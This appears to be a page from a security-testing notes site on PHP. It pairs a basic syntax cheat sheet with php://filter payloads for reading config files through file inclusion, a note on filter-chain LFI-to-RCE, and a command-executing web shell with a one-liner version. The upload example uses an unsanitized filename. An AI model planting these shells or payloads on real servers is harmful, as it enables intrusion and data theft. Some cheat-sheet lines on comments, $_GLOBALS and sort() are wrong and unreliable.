---
title: PHP
layout: post
date: 2025-04-25
description: "PHP is a server-side scripting language designed primarily for web development but also used as a general-purpose programming language. It is widely used for creating dynamic web pages and applications."
permalink: /theory/misc/php
---

## Overview
PHP (Hypertext Preprocessor) is a widely-used open-source server-side scripting language that is especially suited for web development. It can be embedded into HTML and is often used to manage dynamic content, databases, session tracking, and even build entire e-commerce sites. PHP is known for its simplicity and flexibility, making it a popular choice among developers.

## PHP Filters
PHP filters are used to validate and sanitize external input. They can be used to filter data from various sources, such as user input from forms, cookies, and URL parameters. PHP provides a set of built-in filters that can be used to validate and sanitize data.

### Common PHP Filters
- Convert to base64 encoding `php://filter/convert.base64-encode/resource=db.php`, `php://filter/read=convert.base64-encode/resource=config.php`

### PHP Filter Chain
Using a series of filters, you can create a filter chain to process data. For example, you can prepend a string with a specific prefix to data. We can use the [Wrapwrap](https://github.com/ambionics/wrapwrap) tool to create a filter chain.

0xdf has a very nice [video explanation](https://www.youtube.com/watch?v=TnLELBtmZ24) on PHP filter chains LFI2RCE.

## Cheat Sheet
### Basic Syntax
```php
<?php
// This is a single-line comment
# This is a multi-line comment
/*
This is a multi-line comment
*/
echo "Hello, World!"; // Output to the browser
?>
```
#### Variables
```php
<?php
$variable_name = "value"; // Variable declaration
$number = 10; // Integer
$string = "Hello"; // String
$array = array(1, 2, 3); // Array
$associative_array = array("key" => "value"); // Associative array
$boolean = true; // Boolean
?>
```
#### Control Structures
```php
<?php
// If statement
if ($condition) {
    // Code to execute if condition is true
} elseif ($another_condition) {
    // Code to execute if another condition is true
} else {
    // Code to execute if all conditions are false
}
// Switch statement
switch ($variable) {
    case 'value1':
        // Code to execute if variable equals value1
        break;
    case 'value2':
        // Code to execute if variable equals value2
        break;
    default:
        // Code to execute if no cases match
}
// For loop
for ($i = 0; $i < 10; $i++) {
    // Code to execute in each iteration
}
// While loop
while ($condition) {
    // Code to execute while condition is true
}
// Do-while loop
do {
    // Code to execute at least once
} while ($condition);
?>
```
#### Functions
```php
<?php
function functionName($parameter1, $parameter2) {
    // Code to execute
    return $result; // Return value
}
// Anonymous function (closure)
$closure = function($parameter) {
    // Code to execute
    return $result; // Return value
};
// Function with default parameter
function functionName($parameter1 = "default") {
    // Code to execute
    return $result; // Return value
}
// Variable-length argument list
function functionName(...$args) {
    // Code to execute
    return $result; // Return value
}
?>
```
#### Arrays
```php
<?php
// Creating an array
$array = array(1, 2, 3); // Indexed array
$associative_array = array("key1" => "value1", "key2" => "value2"); // Associative array
// Accessing array elements
echo $array[0]; // Output: 1
echo $associative_array["key1"]; // Output: value1
// Adding elements to an array
$array[] = 4; // Append to indexed array
$associative_array["key3"] = "value3"; // Add to associative array
// Looping through an array
foreach ($array as $value) {
    // Code to execute for each value
}
foreach ($associative_array as $key => $value) {
    // Code to execute for each key-value pair
}
// Array functions
$length = count($array); // Get the length of an array
$sorted_array = sort($array); // Sort an array
$reversed_array = array_reverse($array); // Reverse an array
$merged_array = array_merge($array1, $array2); // Merge two arrays
$unique_array = array_unique($array); // Remove duplicate values
$filtered_array = array_filter($array, function($value) {
    return $value > 2; // Filter values greater than 2
});
$mapped_array = array_map(function($value) {
    return $value * 2; // Double each value
}, $array);
?>
```
#### Strings
```php
<?php
// String concatenation
$string1 = "Hello";
$string2 = "World";
$concatenated_string = $string1 . " " . $string2; // Output: Hello World
// String functions
$length = strlen($string); // Get the length of a string
$uppercase = strtoupper($string); // Convert to uppercase
$lowercase = strtolower($string); // Convert to lowercase
$substring = substr($string, 0, 5); // Get substring (first 5 characters)
$position = strpos($string, "World"); // Find position of substring
$replaced_string = str_replace("World", "PHP", $string); // Replace substring
$trimmed_string = trim($string); // Remove whitespace from both ends
$split_string = explode(" ", $string); // Split string into array
$joined_string = implode(" ", $array); // Join array into string
?>
```
### PHP Superglobals
```php
<?php
// $_GET: Used to collect data sent in the URL query string
// $_POST: Used to collect data sent in the HTTP POST method
// $_REQUEST: Used to collect data from both $_GET and $_POST
// $_SESSION: Used to store session variables
// $_COOKIE: Used to collect data from cookies
// $_FILES: Used to collect data from file uploads
// $_SERVER: Contains information about headers, paths, and script locations
// $_ENV: Contains environment variables
// $_GLOBALS: Used to access global variables from anywhere in the script
// Example of using $_GET
if (isset($_GET['name'])) {
    $name = $_GET['name'];
    echo "Hello, " . htmlspecialchars($name);
}
// Example of using $_POST
if (isset($_POST['submit'])) {
    $name = $_POST['name'];
    echo "Hello, " . htmlspecialchars($name);
}
// Example of using $_SESSION
session_start(); // Start the session
$_SESSION['username'] = "JohnDoe"; // Set session variable
echo $_SESSION['username']; // Output: JohnDoe
// Example of using $_COOKIE
setcookie("username", "JohnDoe", time() + (86400 * 30), "/"); // Set cookie for 30 days
if (isset($_COOKIE['username'])) {
    echo "Hello, " . htmlspecialchars($_COOKIE['username']);
}
// Example of using $_FILES
if (isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $filename = $file['name'];
    $tempname = $file['tmp_name'];
    move_uploaded_file($tempname, "uploads/" . $filename); // Move uploaded file
    echo "File uploaded successfully!";
}
// Example of using $_SERVER
echo $_SERVER['HTTP_USER_AGENT']; // Output the user agent string
// Example of using $_ENV
$path = getenv('PATH'); // Get the PATH environment variable
echo $path; // Output the PATH variable
// Example of using $_GLOBALS
$global_variable = "I am global";
function globalFunction() {
    echo $GLOBALS['global_variable']; // Access global variable
}
globalFunction(); // Output: I am global
?>
```
### Simple PHP Web Shell
```php
<?php
// Simple PHP Web Shell
if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    system($cmd); // Execute command
}
else {
    echo "Nothing to do";
}
?>
```
One liner:
```php
<?php system($_REQUEST['cmd']); ?>
```
